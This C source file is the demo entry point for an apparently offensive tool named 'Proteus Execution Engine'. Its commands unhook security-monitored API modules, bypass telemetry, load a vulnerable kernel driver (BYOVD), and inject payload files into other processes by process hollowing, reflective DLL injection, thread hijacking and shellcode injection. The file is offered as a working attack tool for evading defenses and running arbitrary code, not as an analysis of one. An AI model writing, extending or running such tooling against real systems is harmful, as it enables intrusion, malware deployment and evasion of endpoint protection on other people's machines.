/* ============================================================================
 * Proteus- Execution Engine -- demo/main.c
 * Demo program showcasing all engine capabilities.
 * ============================================================================ */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "injection.h"
#include "api_unhooking.h"
#include "byovd.h"
#include "pal.h"

static void print_banner(void) {
    printf("\n");
    printf("  ____            _                  \n");
    printf(" |  _ \\ _ __ ___ | |_ ___ _   _ ___  \n");
    printf(" | |_) | '__/ _ \\| __/ _ \\ | | / __| \n");
    printf(" |  __/| | | (_) | ||  __/ |_| \\__ \\ \n");
    printf(" |_|   |_|  \\___/ \\__\\___|\\__,_|___/ \n");
    printf("     Execution Engine v1.0           \n");
    printf("\n");
}

static void print_usage(const char* prog) {
    printf("Usage: %s <command> [options]\n\n", prog);
    printf("Commands:\n");
    printf("  unhook <module>            Unhook a loaded module\n");
    printf("  bypass                     Bypass telemetry\n");
    printf("  load-driver <path>         Load a vulnerable driver (BYOVD)\n");
    printf("  unload-driver <name>       Unload a driver\n");
    printf("  hollow <image> <payload>   Process hollowing injection\n");
    printf("  reflect <pid> <payload>    Reflective DLL injection\n");
    printf("  hijack <pid> <payload>     Thread hijacking injection\n");
    printf("  shellcode <pid> <payload>  Shellcode injection\n");
    printf("\n");
}

static void* read_file(const char* path, size_t* out_size) {
    FILE* f = fopen(path, "rb");
    if (!f) { perror("fopen"); return NULL; }
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);
    void* data = malloc(size);
    if (data) {
        if (fread(data, 1, size, f) != (size_t)size) {
            free(data);
            data = NULL;
        } else {
            *out_size = (size_t)size;
        }
    }
    fclose(f);
    return data;
}

int main(int argc, char** argv) {
    print_banner();

    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }

    const char* cmd = argv[1];

    if (strcmp(cmd, "unhook") == 0) {
        if (argc < 3) { printf("[-] Module name required\n"); return 1; }
        printf("[*] Unhooking module: %s\n", argv[2]);
        int ret = unhook_module(argv[2]);
        printf("[%s] unhook_module returned %d\n", ret == 0 ? "+" : "!", ret);
        return ret == 0 ? 0 : 1;
    }

    if (strcmp(cmd, "bypass") == 0) {
        printf("[*] Bypassing telemetry...\n");
        int ret = bypass_telemetry();
        printf("[%s] bypass_telemetry returned %d\n", ret == 0 ? "+" : "!", ret);
        return ret == 0 ? 0 : 1;
    }

    if (strcmp(cmd, "load-driver") == 0) {
        if (argc < 3) { printf("[-] Driver path required\n"); return 1; }
        printf("[*] Loading driver: %s\n", argv[2]);
        int ret = load_byovd(argv[2]);
        printf("[%s] load_byovd returned %d\n", ret == 0 ? "+" : "!", ret);
        return ret == 0 ? 0 : 1;
    }

    if (strcmp(cmd, "unload-driver") == 0) {
        if (argc < 3) { printf("[-] Driver name required\n"); return 1; }
        printf("[*] Unloading driver: %s\n", argv[2]);
        int ret = unload_byovd(argv[2]);
        printf("[%s] unload_byovd returned %d\n", ret == 0 ? "+" : "!", ret);
        return ret == 0 ? 0 : 1;
    }

    if (strcmp(cmd, "hollow") == 0) {
        if (argc < 4) { printf("[-] Usage: %s hollow <target_image> <payload_file>\n", argv[0]); return 1; }
        size_t payloadSize = 0;
        void* payload = read_file(argv[3], &payloadSize);
        if (!payload) { printf("[-] Failed to read payload\n"); return 1; }

        InjectionConfig cfg = {0};
        cfg.method = INJECT_METHOD_PROCESS_HOLLOWING;
        cfg.targetImage = argv[2];
        cfg.payload = payload;
        cfg.payloadSize = payloadSize;
        cfg.unhookApi = 0;
        cfg.useDirectSyscalls = 0;

        printf("[*] Performing process hollowing into: %s\n", argv[2]);
        int ret = inject_process(&cfg);
        free(payload);
        printf("[%s] Injection returned %d\n", ret == 0 ? "+" : "!", ret);
        return ret == 0 ? 0 : 1;
    }

    if (strcmp(cmd, "reflect") == 0) {
        if (argc < 4) { printf("[-] Usage: %s reflect <pid> <payload_file>\n", argv[0]); return 1; }
        size_t payloadSize = 0;
        void* payload = read_file(argv[3], &payloadSize);
        if (!payload) { printf("[-] Failed to read payload\n"); return 1; }

        InjectionConfig cfg = {0};
        cfg.method = INJECT_METHOD_REFLECTIVE_DLL;
        cfg.targetPid = (uint32_t)strtoul(argv[2], NULL, 10);
        cfg.payload = payload;
        cfg.payloadSize = payloadSize;
        cfg.unhookApi = 0;
        cfg.useDirectSyscalls = 0;

        printf("[*] Performing reflective DLL injection into PID: %lu\n", (unsigned long)cfg.targetPid);
        int ret = inject_process(&cfg);
        free(payload);
        printf("[%s] Injection returned %d\n", ret == 0 ? "+" : "!", ret);
        return ret == 0 ? 0 : 1;
    }

    if (strcmp(cmd, "hijack") == 0) {
        if (argc < 4) { printf("[-] Usage: %s hijack <pid> <payload_file>\n", argv[0]); return 1; }
        size_t payloadSize = 0;
        void* payload = read_file(argv[3], &payloadSize);
        if (!payload) { printf("[-] Failed to read payload\n"); return 1; }

        InjectionConfig cfg = {0};
        cfg.method = INJECT_METHOD_THREAD_HIJACKING;
        cfg.targetPid = (uint32_t)strtoul(argv[2], NULL, 10);
        cfg.payload = payload;
        cfg.payloadSize = payloadSize;
        cfg.unhookApi = 0;
        cfg.useDirectSyscalls = 0;

        printf("[*] Performing thread hijacking into PID: %lu\n", (unsigned long)cfg.targetPid);
        int ret = inject_process(&cfg);
        free(payload);
        printf("[%s] Injection returned %d\n", ret == 0 ? "+" : "!", ret);
        return ret == 0 ? 0 : 1;
    }

    if (strcmp(cmd, "shellcode") == 0) {
        if (argc < 4) { printf("[-] Usage: %s shellcode <pid> <payload_file>\n", argv[0]); return 1; }
        size_t payloadSize = 0;
        void* payload = read_file(argv[3], &payloadSize);
        if (!payload) { printf("[-] Failed to read payload\n"); return 1; }

        InjectionConfig cfg = {0};
        cfg.method = INJECT_METHOD_SHELLCODE;
        cfg.targetPid = (uint32_t)strtoul(argv[2], NULL, 10);
        cfg.payload = payload;
        cfg.payloadSize = payloadSize;
        cfg.unhookApi = 0;
        cfg.useDirectSyscalls = 0;

        printf("[*] Performing shellcode injection into PID: %lu\n", (unsigned long)cfg.targetPid);
        int ret = inject_process(&cfg);
        free(payload);
        printf("[%s] Injection returned %d\n", ret == 0 ? "+" : "!", ret);
        return ret == 0 ? 0 : 1;
    }

    printf("[-] Unknown command: %s\n", cmd);
    print_usage(argv[0]);
    return 1;
}
